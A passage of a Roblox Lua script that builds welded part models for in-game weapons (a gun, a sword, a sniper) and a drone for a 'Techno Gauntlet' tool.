mshgear=mesh("BlockMesh",prtgear,"","",vt(0,0,0),vt(0.4,0.09,0.07))
local wldgear=weld(prtgear,prtgear,prt9,euler(0,numb,0)*cf(0,0,0))
numb=numb+0.628
end
 
local gun = Instance.new("Model")
gun.Parent = modelzorz
gun.Name = "Blitz"
gun.Parent=nil
 
local gprt1=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local gprt2=part(3,gun,0,0,BrickColor.new("Black"),"Part2",vt(1,1,1))
local gprt3=part(3,gun,0,0,BrickColor.new("Black"),"Part3",vt(1,1,1))
local gprt4=part(3,gun,0,0,BrickColor.new("Black"),"Part4",vt(1,1,1))
local gprt5=part(3,gun,0,0,BrickColor.new("Black"),"Part5",vt(1,1,1))
local gprt6=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part6",vt(1,1,1))
local gprt7=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part7",vt(1,1,1))
local gprt8=part(3,gun,0,0,BrickColor.new("Black"),"Part8",vt(1,1,1))
local gprt9=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part9",vt(1,1,1))
local gprt10=part(3,gun,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
local gprt11=part(3,gun,0,0,BrickColor.new("Black"),"Part11",vt(1,1,1))
local gprt12=part(3,gun,0,0,BrickColor.new("Black"),"Part12",vt(1,1,1))
local gprt13=part(3,gun,0,0,BrickColor.new("Black"),"Part13",vt(1,1,1))
local gprt14=part(3,gun,0,0,BrickColor.new("Black"),"Part14",vt(1,1,1))
local gprt15=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part15",vt(1,1,1))
local gprt16=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part16",vt(1,1,1))
local gprt17=part(3,gun,0,0,BrickColor.new("Really black"),"Part17",vt(1,1,1))
local gprt18=part(3,gun,0,0,BrickColor.new("Black"),"Part18",vt(1,1,1))
local gprt19=part(3,gun,0,0,BrickColor.new("Dark stone grey"),"Part19",vt(1,1,1))
local gprt20=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part20",vt(1,1,1))
local gprt21=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part21",vt(1,1,1))
local gprt22=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part22",vt(1,1,1))
 
gmsh1=mesh("BlockMesh",gprt1,"","",vt(0,0,0),vt(0.2,0.7,0.2))
gmsh2=mesh("BlockMesh",gprt2,"","",vt(0,0,0),vt(0.25,0.2,0.25))
gmsh3=mesh("BlockMesh",gprt3,"","",vt(0,0,0),vt(0.25,0.2,0.25))
gmsh4=mesh("BlockMesh",gprt4,"","",vt(0,0,0),vt(0.5,0.5,0.7))
gmsh5=mesh("CylinderMesh",gprt5,"","",vt(0,0,0),vt(0.5,0.49,0.5))
gmsh6=mesh("CylinderMesh",gprt6,"","",vt(0,0,0),vt(0.1,0.5,0.1))
gmsh7=mesh("BlockMesh",gprt7,"","",vt(0,0,0),vt(0.55,0.3,0.3))
gmsh8=mesh("CylinderMesh",gprt8,"","",vt(0,0,0),vt(0.7,0.7,0.7))
gmsh9=mesh("CylinderMesh",gprt9,"","",vt(0,0,0),vt(0.4,0.71,0.4))
gmsh10=mesh("BlockMesh",gprt10,"","",vt(0,0,0),vt(0.3,0.4,0.3))
gmsh11=mesh("BlockMesh",gprt11,"","",vt(0,0,0),vt(0.2,2.5,0.5))
gmsh12=mesh("CylinderMesh",gprt12,"","",vt(0,0,0),vt(0.3,0.51,0.3))
gmsh13=mesh("BlockMesh",gprt13,"","",vt(0,0,0),vt(0.2,0.3,0.5))
gmsh14=mesh("CylinderMesh",gprt14,"","",vt(0,0,0),vt(0.3,0.2,0.3))
gmsh15=mesh("CylinderMesh",gprt15,"","",vt(0,0,0),vt(0.2,0.35,0.2))
gmsh16=mesh("CylinderMesh",gprt16,"","",vt(0,0,0),vt(0.2,0.21,0.2))
gmsh17=mesh("CylinderMesh",gprt17,"","",vt(0,0,0),vt(0.15,0.22,0.15))
gmsh18=mesh("CylinderMesh",gprt18,"","",vt(0,0,0),vt(0.6,0.2,0.6))
gmsh19=mesh("CylinderMesh",gprt19,"","",vt(0,0,0),vt(0.7,0.2,0.7))
gmsh20=mesh("CylinderMesh",gprt20,"","",vt(0,0,0),vt(0.6,1.5,0.6))
gmsh21=mesh("CylinderMesh",gprt21,"","",vt(0,0,0),vt(0.69,0.5,0.69))
gmsh22=mesh("CylinderMesh",gprt22,"","",vt(0,0,0),vt(0.69,0.31,0.69))
 
local GunWelds={}
local gwld1=weld(gprt1,gprt1,Torso,euler(0.5,1.57,0)*cf(1,-0.5,1.8))
local gwld2=weld(gprt2,gprt2,gprt1,euler(0,0,0)*cf(0,0.3,0))
local gwld3=weld(gprt3,gprt3,gprt1,euler(0,0,0)*cf(0,-0.3,0))
local gwld4=weld(gprt4,gprt4,gprt3,euler(-0.5,0,0)*cf(0,-0.1,-0.1))
local gwld5=weld(gprt5,gprt5,gprt4,euler(0,0,1.57)*cf(0,0,-0.35))
local gwld6=weld(gprt6,gprt6,gprt5,cf(0,0,-0.1))
local gwld7=weld(gprt7,gprt7,gprt4,cf(0,0,-0.1))
local gwld8=weld(gprt8,gprt8,gprt4,euler(0,0,1.57)*cf(0,0,0.4))
local gwld9=weld(gprt9,gprt9,gprt8,cf(0,0,0))
local gwld10=weld(gprt10,gprt10,gprt8,euler(1.57,0,0)*cf(0,0,0.4)*euler(0,0.7,0))
local gwld11=weld(gprt11,gprt11,gprt8,euler(1.57,0,0)*cf(0.3,0,0.9))
local gwld12=weld(gprt12,gprt12,gprt11,euler(-1.57,0,0)*cf(0,-1.3,0))
local gwld13=weld(gprt13,gprt13,gprt12,cf(0,0,0.3)*euler(0,1.57,0))
local gwld14=weld(gprt14,gprt14,gprt13,cf(0.05,0,0.25))
local gwld15=weld(gprt15,gprt15,gprt14,cf(0,0,0))
local gwld16=weld(gprt16,gprt16,gprt13,euler(0,0,1.57)*cf(0,0,-0.1))
local gwld17=weld(gprt17,gprt17,gprt16,cf(0,0,0))
local gwld18=weld(gprt18,gprt18,gprt8,euler(1.57,0,0)*cf(-0.1,0,0.4))
local gwld19=weld(gprt19,gprt19,gprt18,cf(-0.05,-0.15,0))
local gwld20=weld(gprt20,gprt20,gprt19,cf(0,-0.8,0))
local gwld21=weld(gprt21,gprt21,gprt20,cf(0,0.5,0))
local gwld22=weld(gprt22,gprt22,gprt20,cf(0,-0.6,0))
table.insert(GunWelds,gwld1)
table.insert(GunWelds,gwld2)
table.insert(GunWelds,gwld3)
table.insert(GunWelds,gwld4)
table.insert(GunWelds,gwld5)
table.insert(GunWelds,gwld6)
table.insert(GunWelds,gwld7)
table.insert(GunWelds,gwld8)
table.insert(GunWelds,gwld9)
table.insert(GunWelds,gwld10)
table.insert(GunWelds,gwld11)
table.insert(GunWelds,gwld12)
table.insert(GunWelds,gwld13)
table.insert(GunWelds,gwld14)
table.insert(GunWelds,gwld15)
table.insert(GunWelds,gwld16)
table.insert(GunWelds,gwld17)
table.insert(GunWelds,gwld18)
table.insert(GunWelds,gwld19)
table.insert(GunWelds,gwld20)
table.insert(GunWelds,gwld21)
table.insert(GunWelds,gwld22)
 
numb=1.57
for i=1,10 do
local gprt23=part(3,gun,0,0,BrickColor.new("Medium stone grey"),"Part23",vt(1,1,1))
gmsh23=mesh("CylinderMesh",gprt23,"","",vt(0,0,0),vt(0.15,0.7,0.15))
local gwld23=weld(gprt23,gprt23,gprt20,cf(0,-0.1,-0.25)*euler(0,numb,0))
table.insert(GunWelds,gwld23)
local gprt24=part(3,gun,0,0,BrickColor.new("Really black"),"Part24",vt(1,1,1))
gmsh24=mesh("CylinderMesh",gprt24,"","",vt(0,0,0),vt(0.14,1.52,0.14))
local gwld24=weld(gprt24,gprt24,gprt20,cf(0,0,-0.25)*euler(0,numb,0))
table.insert(GunWelds,gwld24)
numb=numb+0.628
end
 
local sword=Instance.new("Model")
sword.Parent=modelzorz
sword.Name="Daku"
sword.Parent=nil
 
local sprt1=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local sprt2=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part2",vt(1,1,1))
local sprt3=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
local sprt4=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part4",vt(1,1,1))
local sprt5=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part5",vt(1,1,1))
local sprt6=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part6",vt(1,1,1))
local sprt7=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part7",vt(1,1,1))
local sprt8=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part8",vt(1,1,1))
local sprt9=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part9",vt(1,1,1))
local sprt10=part(3,sword,0,0,BrickColor.new("Dark stone grey"),"Part10",vt(1,1,1))
local sprt11=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part11",vt(1,1,1))
local sprt12=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part12",vt(1,1,1))
local sprt13=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part13",vt(1,1,1))
local sprt14=part(3,sword,0,0,BrickColor.new("Medium stone grey"),"Part14",vt(1,1,1))
local sprt15=part(3,sword,0,0,BrickColor.new("Light stone grey"),"Part15",vt(1,1,1))
local sprt16=part(3,sword,0,1,BrickColor.new("Black"),"Hitbox",vt(1,7,1.5))
local sprt17=part(3,sword,0,0,BrickColor.new("Bright yellow"),"Top",vt(1,1,1))
local sprt18=part(3,sword,0,1,BrickColor.new("Black"),"Mid",vt(0.1,0.1,0.1))
local sprt19=part(3,sword,0,0,BrickColor.new("Bright yellow"),"Bottom",vt(1,1,1))
 
smsh1=mesh("BlockMesh",sprt1,"","",vt(0,0,0),vt(0.2,1,0.2))
smsh2=mesh("SpecialMesh",sprt2,"Head","",vt(0,0,0),vt(0.4,0.3,0.4))
smsh3=mesh("BlockMesh",sprt3,"","",vt(0,0,0),vt(0.25,0.5,0.25))
smsh4=mesh("SpecialMesh",sprt4,"Head","",vt(0,0,0),vt(0.5,0.3,0.5))
smsh5=mesh("CylinderMesh",sprt5,"","",vt(0,0,0),vt(0.5,0.2,0.5))
smsh6=mesh("BlockMesh",sprt6,"","",vt(0,0,0),vt(0.5,0.2,0.35))
smsh7=mesh("BlockMesh",sprt7,"","",vt(0,0,0),vt(0.2,0.19,0.2))
smsh8=mesh("BlockMesh",sprt8,"","",vt(0,0,0),vt(0.8,0.15,0.5))
smsh9=mesh("SpecialMesh",sprt9,"Head","",vt(0,0,0),vt(0.4,0.3,0.4))
smsh10=mesh("BlockMesh",sprt10,"","",vt(0,0,0),vt(0.25,0.5,0.25))
smsh11=mesh("SpecialMesh",sprt11,"Head","",vt(0,0,0),vt(0.5,0.3,0.5))
smsh12=mesh("CylinderMesh",sprt12,"","",vt(0,0,0),vt(0.5,0.2,0.5))
smsh13=mesh("BlockMesh",sprt13,"","",vt(0,0,0),vt(0.5,0.2,0.35))
smsh14=mesh("BlockMesh",sprt14,"","",vt(0,0,0),vt(0.2,0.19,0.2))
smsh15=mesh("BlockMesh",sprt15,"","",vt(0,0,0),vt(0.8,0.15,0.5))
smsh17=mesh("CylinderMesh",sprt17,"","",vt(0,0,0),vt(0.1,0.05,0.1))
smsh19=mesh("CylinderMesh",sprt19,"","",vt(0,0,0),vt(0.1,0.05,0.1))
 
local SwordWelds={}
local swld1=weld(sprt1,sprt1,Torso,euler(0,0,1.57)*cf(0,-4,0))
local swld2=weld(sprt2,sprt2,sprt1,euler(0,0,0)*cf(0,-0.4,0))
local swld3=weld(sprt3,sprt3,sprt2,euler(0,0,0)*cf(0,-0.3,0))
local swld4=weld(sprt4,sprt4,sprt3,euler(0,0,0)*cf(0,-0.3,0))
local swld5=weld(sprt5,sprt5,sprt4,euler(0,0,0)*cf(0,-0.15,0))
local swld6=weld(sprt6,sprt6,sprt5,euler(0,0,1.57)*cf(0,-0.2,0))
local swld7=weld(sprt7,sprt7,sprt6,euler(0,0.785,0)*cf(0,0,-0.17))
local swld8=weld(sprt8,sprt8,sprt5,euler(0,0,1.57)*cf(0,-0.4,0))
local swld9=weld(sprt9,sprt9,sprt1,euler(3.14,3.14,0)*cf(0,0.4,0))
local swld10=weld(sprt10,sprt10,sprt9,euler(0,0,0)*cf(0,-0.3,0))
local swld11=weld(sprt11,sprt11,sprt10,euler(0,0,0)*cf(0,-0.3,0))
local swld12=weld(sprt12,sprt12,sprt11,euler(0,0,0)*cf(0,-0.15,0))
local swld13=weld(sprt13,sprt13,sprt12,euler(0,0,1.57)*cf(0,-0.2,0))
local swld14=weld(sprt14,sprt14,sprt13,euler(0,0.785,0)*cf(0,0,-0.17))
local swld15=weld(sprt15,sprt15,sprt12,euler(0,0,1.57)*cf(0,-0.4,0))
local swld16=weld(sprt16,sprt16,sprt1,cf(0,0,-0.3))
local swld17=weld(sprt17,sprt17,sprt1,euler(0.55,0,0)*cf(0,3.7,-0.79))
local swld18=weld(sprt18,sprt18,sprt1,cf(0,0,-0.8))
local swld19=weld(sprt19,sprt19,sprt1,euler(-0.55,0,0)*cf(0,-3.7,-0.79))
table.insert(SwordWelds,swld1)
table.insert(SwordWelds,swld2)
table.insert(SwordWelds,swld3)
table.insert(SwordWelds,swld4)
table.insert(SwordWelds,swld5)
table.insert(SwordWelds,swld6)
table.insert(SwordWelds,swld7)
table.insert(SwordWelds,swld8)
table.insert(SwordWelds,swld9)
table.insert(SwordWelds,swld10)
table.insert(SwordWelds,swld11)
table.insert(SwordWelds,swld12)
table.insert(SwordWelds,swld13)
table.insert(SwordWelds,swld14)
table.insert(SwordWelds,swld15)
table.insert(SwordWelds,swld16)
table.insert(SwordWelds,swld17)
table.insert(SwordWelds,swld18)
table.insert(SwordWelds,swld19)
 
numb=0
numb2=0
bend=0
for i=1,8 do
local sprtblade1=part(3,sword,0.3,0,BrickColor.new("White"),"Partblade1",vt(1,1,1))
smshblade1=mesh("SpecialMesh",sprtblade1,"Wedge","",vt(0,0,0),vt(0.1+numb2,0.7,0.7))
local swldblade1=weld(sprtblade1,sprtblade1,sprt5,euler(0,0,0)*cf(0,-0.3-numb,0.1+bend)*euler(-bend,0,0))
table.insert(SwordWelds,swldblade1)
local sprtblade2=part(3,sword,0.3,0,BrickColor.new("White"),"Partblade2",vt(1,1,1))
smshblade2=mesh("SpecialMesh",sprtblade2,"Wedge","",vt(0,0,0),vt(0.1+numb2,0.7,0.7))
local swldblade2=weld(sprtblade2,sprtblade2,sprt12,euler(0,0,0)*cf(0,-0.3-numb,0.1+bend)*euler(-bend,0,0))
table.insert(SwordWelds,swldblade2)
numb=numb+0.3
numb2=numb2-0.01
bend=bend+0.05
end
 
local sniper=Instance.new("Model")
sniper.Parent=modelzorz
sniper.Name="Hand Sniper"
sniper.Parent=nil
 
local snprt1=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local snprt2=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part2",vt(1,1,1))
local snprt3=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
local snprt4=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part4",vt(1,1,1))
local snprt5=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part5",vt(1,1,1))
local snprt6=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part6",vt(1,1,1))
local snprt7=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part7",vt(1,1,1))
local snprt8=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part8",vt(1,1,1))
local snprt9=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part9",vt(1,1,1))
local snprt10=part(3,sniper,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
local snprt11=part(3,sniper,0,0,BrickColor.new("Black"),"Part11",vt(1,1,1))
local snprt12=part(3,sniper,0,0,BrickColor.new("Black"),"Part12",vt(1,1,1))
local snprt13=part(3,sniper,0,0,BrickColor.new("Black"),"Part13",vt(1,1,1))
local snprt14=part(3,sniper,0,0,BrickColor.new("Black"),"Part14",vt(1,1,1))
local snprt15=part(3,sniper,0,0,BrickColor.new("Really black"),"Part15",vt(1,1,1))
local snprt16=part(3,sniper,0,0,BrickColor.new("Black"),"Part16",vt(1,1,1))
local snprt17=part(3,sniper,0,0,BrickColor.new("Black"),"Part17",vt(1,1,1))
local snprt18=part(3,sniper,0,0,BrickColor.new("Black"),"Part18",vt(1,1,1))
local snprt19=part(3,sniper,0,0,BrickColor.new("Black"),"Part19",vt(1,1,1))
local snprt20=part(3,sniper,0,0,BrickColor.new("Black"),"Part20",vt(1,1,1))
local snprt21=part(3,sniper,0,0,BrickColor.new("Black"),"Part21",vt(1,1,1))
local snprt22=part(3,sniper,0,0,BrickColor.new("Black"),"Part22",vt(1,1,1))
local snprt23=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part23",vt(1,1,1))
local snprt24=part(3,sniper,0,0,BrickColor.new("Medium stone grey"),"Part24",vt(1,1,1))
local snprt25=part(3,sniper,0,0,BrickColor.new("Black"),"Part25",vt(1,1,1))
local snprt26=part(3,sniper,0,0,BrickColor.new("Black"),"Part26",vt(1,1,1))
local snprt27=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part27",vt(1,1,1))
local snprt28=part(3,sniper,0,0,BrickColor.new("Black"),"Part28",vt(1,1,1))
local snprt29=part(3,sniper,0,0,BrickColor.new("Black"),"Part29",vt(1,1,1))
 
snmsh1=mesh("BlockMesh",snprt1,"","",vt(0,0,0),vt(0.2,1,0.2))
snmsh2=mesh("BlockMesh",snprt2,"","",vt(0,0,0),vt(0.201,0.5,0.5))
snmsh3=mesh("BlockMesh",snprt3,"","",vt(0,0,0),vt(0.2,0.3,0.3))
snmsh4=mesh("BlockMesh",snprt4,"","",vt(0,0,0),vt(0.199,0.6,0.7))
snmsh5=mesh("BlockMesh",snprt5,"","",vt(0,0,0),vt(0.198,0.9,0.3))
snmsh6=mesh("BlockMesh",snprt6,"","",vt(0,0,0),vt(0.202,3.5,0.3))
snmsh7=mesh("BlockMesh",snprt7,"","",vt(0,0,0),vt(0.1,0.5,0.1))
snmsh8=mesh("BlockMesh",snprt8,"","",vt(0,0,0),vt(0.1,0.6,0.1))
snmsh9=mesh("BlockMesh",snprt9,"","",vt(0,0,0),vt(0.201,1.7,0.2))
snmsh10=mesh("BlockMesh",snprt10,"","",vt(0,0,0),vt(0.15,0.4,0.4))
snmsh11=mesh("BlockMesh",snprt11,"","",vt(0,0,0),vt(0.201,0.8,0.2))
snmsh12=mesh("CylinderMesh",snprt12,"","",vt(0,0,0),vt(0.2,4,0.2))
snmsh13=mesh("CylinderMesh",snprt13,"","",vt(0,0,0),vt(0.4,0.2,0.4))
snmsh14=mesh("CylinderMesh",snprt14,"","",vt(0,0,0),vt(0.22,0.3,0.22))
snmsh15=mesh("CylinderMesh",snprt15,"","",vt(0,0,0),vt(0.15,0.301,0.15))
snmsh16=mesh("BlockMesh",snprt16,"","",vt(0,0,0),vt(0.1,0.7,0.1))
snmsh17=mesh("BlockMesh",snprt17,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh18=mesh("BlockMesh",snprt18,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh19=mesh("BlockMesh",snprt19,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh20=mesh("BlockMesh",snprt20,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh21=mesh("CylinderMesh",snprt21,"","",vt(0,0,0),vt(0.2,0.099,0.2))
snmsh22=mesh("CylinderMesh",snprt22,"","",vt(0,0,0),vt(0.2,0.099,0.2))
snmsh23=mesh("CylinderMesh",snprt23,"","",vt(0,0,0),vt(0.199,1,0.199))
snmsh24=mesh("CylinderMesh",snprt24,"","",vt(0,0,0),vt(0.15,1.01,0.15))
snmsh25=mesh("BlockMesh",snprt25,"","",vt(0,0,0),vt(0.3,0.5,0.2))
snmsh26=mesh("CylinderMesh",snprt26,"","",vt(0,0,0),vt(0.05,0.3,0.05))
snmsh27=mesh("SpecialMesh",snprt27,"Sphere","",vt(0,0,0),vt(0.1,0.1,0.1))
snmsh28=mesh("BlockMesh",snprt28,"","",vt(0,0,0),vt(0.05,0.3,0.05))
snmsh29=mesh("CylinderMesh",snprt29,"","",vt(0,0,0),vt(0.15,0.4,0.15))
 
local SniperWelds={}
local snwld1=weld(snprt1,snprt1,Torso,euler(0.5,0,0)*cf(0,-4,0))
local snwld2=weld(snprt2,snprt2,snprt1,euler(-0.5,0,0)*cf(0,0.5,-0.2))
local snwld3=weld(snprt3,snprt3,snprt2,euler(-0.785,0,0)*cf(0,-0.1,-0.2))
local snwld4=weld(snprt4,snprt4,snprt3,euler(0.785,0,0)*cf(0,-0.4,0))
local snwld5=weld(snprt5,snprt5,snprt4,cf(0,0,-0.3))
local snwld6=weld(snprt6,snprt6,snprt1,euler(1.07,0,0)*cf(0,-0.5,0.2))
local snwld7=weld(snprt7,snprt7,snprt6,euler(0,0,0)*cf(0,0.2,0.5))
local snwld8=weld(snprt8,snprt8,snprt6,euler(1.57,0,0)*cf(0,-0.1,0.25))
local snwld9=weld(snprt9,snprt9,snprt6,euler(0,0,0)*cf(0,-0.9,0.25))
local snwld10=weld(snprt10,snprt10,snprt9,euler(0,0,0)*cf(0,0.5,0.2))
local snwld11=weld(snprt11,snprt11,snprt6,euler(0,0,0)*cf(0,0.2,-0.2))
local snwld12=weld(snprt12,snprt12,snprt11,euler(0,0,0)*cf(0,-2,0))
local snwld13=weld(snprt13,snprt13,snprt12,euler(0,0,0)*cf(0,-1.8,0))
local snwld14=weld(snprt14,snprt14,snprt12,euler(0,0,0)*cf(0,-2,0))
local snwld15=weld(snprt15,snprt15,snprt14,euler(0,0,0)*cf(0,0,0))
local snwld16=weld(snprt16,snprt16,snprt11,euler(0,0,0)*cf(0,0,-0.1))
local snwld17=weld(snprt17,snprt17,snprt16,euler(1.57,0,0)*cf(0.05,0.2,-0.1))
local snwld18=weld(snprt18,snprt18,snprt16,euler(1.57,0,0)*cf(-0.05,0.2,-0.1))
local snwld19=weld(snprt19,snprt19,snprt16,euler(1.57,0,0)*cf(-0.05,-0.2,-0.1))
local snwld20=weld(snprt20,snprt20,snprt16,euler(1.57,0,0)*cf(0.05,-0.2,-0.1))
local snwld21=weld(snprt21,snprt21,snprt16,euler(0,0,0)*cf(0,0.2,-0.2))
local snwld22=weld(snprt22,snprt22,snprt16,euler(0,0,0)*cf(0,-0.2,-0.2))
local snwld23=weld(snprt23,snprt23,snprt16,euler(0,0,0)*cf(0,0,-0.2))
local snwld24=weld(snprt24,snprt24,snprt23,euler(0,0,0)*cf(0,0,0))
local snwld25=weld(snprt25,snprt25,snprt6,euler(0,0,0)*cf(0,-0.5,0))
local snwld26=weld(snprt26,snprt26,snprt25,cf(0,-0.3,0)*euler(0.5,0.7,1.57))
local snwld27=weld(snprt27,snprt27,snprt26,cf(0,-0.1,0))
local snwld28=weld(snprt28,snprt28,snprt6,euler(1.57-0.5,0,0)*cf(0,0.2,0.2))
local snwld29=weld(snprt29,snprt29,snprt9,euler(0,0.2,1.57)*cf(0,-0.8,0.1))
table.insert(SniperWelds,snwld1)
table.insert(SniperWelds,snwld2)
table.insert(SniperWelds,snwld3)
table.insert(SniperWelds,snwld4)
table.insert(SniperWelds,snwld5)
table.insert(SniperWelds,snwld6)
table.insert(SniperWelds,snwld7)
table.insert(SniperWelds,snwld8)
table.insert(SniperWelds,snwld9)
table.insert(SniperWelds,snwld10)
table.insert(SniperWelds,snwld11)
table.insert(SniperWelds,snwld12)
table.insert(SniperWelds,snwld13)
table.insert(SniperWelds,snwld14)
table.insert(SniperWelds,snwld15)
table.insert(SniperWelds,snwld16)
table.insert(SniperWelds,snwld17)
table.insert(SniperWelds,snwld18)
table.insert(SniperWelds,snwld19)
table.insert(SniperWelds,snwld20)
table.insert(SniperWelds,snwld21)
table.insert(SniperWelds,snwld22)
table.insert(SniperWelds,snwld23)
table.insert(SniperWelds,snwld24)
table.insert(SniperWelds,snwld25)
table.insert(SniperWelds,snwld26)
table.insert(SniperWelds,snwld27)
table.insert(SniperWelds,snwld28)
table.insert(SniperWelds,snwld29)
 
numb=-0.15
numb2=0.1
for i=1,2 do
local snprt30=part(3,sniper,0,0,BrickColor.new("Black"),"Part30",vt(1,1,1))
local snprt31=part(3,sniper,0,0,BrickColor.new("Black"),"Part31",vt(1,1,1))
local snprt32=part(3,sniper,0,0,BrickColor.new("Black"),"Part32",vt(1,1,1))
local snprt33=part(3,sniper,0,0,BrickColor.new("Black"),"Part33",vt(1,1,1))
local snprt34=part(3,sniper,0,0,BrickColor.new("Black"),"Part34",vt(1,1,1))
local snprt35=part(3,sniper,0,0,BrickColor.new("Black"),"Part35",vt(1,1,1))
local snprt36=part(3,sniper,0,0,BrickColor.new("Black"),"Part36",vt(1,1,1))
local snprt37=part(3,sniper,0,0,BrickColor.new("Black"),"Part37",vt(1,1,1))
snmsh30=mesh("CylinderMesh",snprt30,"","",vt(0,0,0),vt(0.2,0.1,0.2))
snmsh31=mesh("CylinderMesh",snprt31,"","",vt(0,0,0),vt(0.1,0.5,0.1))
snmsh32=mesh("CylinderMesh",snprt32,"","",vt(0,0,0),vt(0.15,0.1,0.15))
snmsh33=mesh("CylinderMesh",snprt33,"","",vt(0,0,0),vt(0.125,0.3,0.125))
snmsh34=mesh("CylinderMesh",snprt34,"","",vt(0,0,0),vt(0.15,0.2,0.15))
snmsh35=mesh("CylinderMesh",snprt35,"","",vt(0,0,0),vt(0.08,0.8,0.08))
snmsh36=mesh("CylinderMesh",snprt36,"","",vt(0,0,0),vt(0.15,0.2,0.15))
snmsh37=mesh("CylinderMesh",snprt37,"","",vt(0,0,0),vt(0.2,0.1,0.2))
local snwld30=weld(snprt30,snprt30,snprt29,euler(0,0,0)*cf(0,numb,0))
local snwld31=weld(snprt31,snprt31,snprt30,euler(0,0,1.57+numb2)*cf(0.25,0,0))
local snwld32=weld(snprt32,snprt32,snprt31,cf(0,0.25,0))
local snwld33=weld(snprt33,snprt33,snprt32,cf(0,0.15,0))
local snwld34=weld(snprt34,snprt34,snprt33,cf(0,0.1,0))
local snwld35=weld(snprt35,snprt35,snprt34,cf(0,0.4,0))
local snwld36=weld(snprt36,snprt36,snprt35,cf(0,0.4,0))
local snwld37=weld(snprt37,snprt37,snprt36,cf(0,0.1,0))
table.insert(SniperWelds,snwld30)
table.insert(SniperWelds,snwld31)
table.insert(SniperWelds,snwld32)
table.insert(SniperWelds,snwld33)
table.insert(SniperWelds,snwld34)
table.insert(SniperWelds,snwld35)
table.insert(SniperWelds,snwld36)
table.insert(SniperWelds,snwld37)
numb=numb+0.3
numb2=numb2-0.2
end
if (script.Parent.className ~= "HopperBin") then
Tool = Instance.new("HopperBin")
Tool.Parent = Backpack
Tool.Name = "Techno Gauntlet"
script.Parent = Tool
end
Bin = script.Parent
 
local Bg = it("BodyGyro")
Bg.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge
Bg.P = 20e+003
Bg.Parent = nil
 
so = function(id,par,vol,pit)
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
wait()
sou:play()
wait(6)
sou:Remove()
end))
end
 
function CreateDrone()
local drone=Instance.new("Model")
drone.Parent=modelzorz
drone.Name="Drone"
 
local dprt1=part(3,drone,0,1,BrickColor.new("White"),"DPart1",vt(1,1,1))
dprt1.CanCollide=true
local dprt6=part(3,drone,0,1,BrickColor.new("Bright red"),"DPart6",vt(1,1,1))
local dprt7=part(3,drone,0,1,BrickColor.new("Black"),"DPart7",vt(1,1,1))
 
local dmsh1=mesh("SpecialMesh",dprt1,"Sphere","",vt(0,0,0),vt(1,1,1))
local dmsh6=mesh("CylinderMesh",dprt6,"","",vt(0,0,0),vt(0.5,0.2,0.5))
local dmsh7=mesh("CylinderMesh",dprt7,"","",vt(0,0,0),vt(0.4,0.21,0.4))
 
--local dwld1=weld(dprt1,dprt1,Torso,euler(0,0,0)*cf(0,-5,0))
local dwld6=weld(dprt6,dprt6,dprt1,euler(1.57,0,0)*cf(0,0,0.4))
local dwld7=weld(dprt7,dprt7,dprt6,cf(0,0,0))
 
numb=0
for i=1,4 do
local dprt2=part(3,drone,0,1,BrickColor.new("Medium stone grey"),"DPart2",vt(1,1,1))
local dmsh2=mesh("BlockMesh",dprt2,"","",vt(0,0,0),vt(0.5,0.5,0.8))
local dwld2=weld(dprt2,dprt2,dprt1,cf(0,-0.5,0)*euler(0,0,numb))
numb=numb+1.57
end
numb=0
for i=1,4 do
local dprt3=part(3,drone,0,1,BrickColor.new("Dark stone grey"),"DPart3",vt(1,1,1))
local dmsh3=mesh("BlockMesh",dprt3,"","",vt(0,0,0),vt(0.5,0.5,0.79))
local dwld3=weld(dprt3,dprt3,dprt1,cf(0,-0.3,0)*euler(0,0,0.785+numb))
numb=numb+1.57
end
numb=0
for i=1,4 do
local dprt4=part(3,drone,0,1,BrickColor.new("Dark stone grey"),"DPart4",vt(1,1,1))
local dmsh4=mesh("BlockMesh",dprt4,"","",vt(0,0,0),vt(0.2,0.8,0.2))
local dwld4=weld(dprt4,dprt4,dprt1,cf(0,0.8,0)*euler(0.785,numb,0))
local dprt5=part(3,drone,0,1,BrickColor.new("Bright blue"),"DPart5",vt(1,1,1))
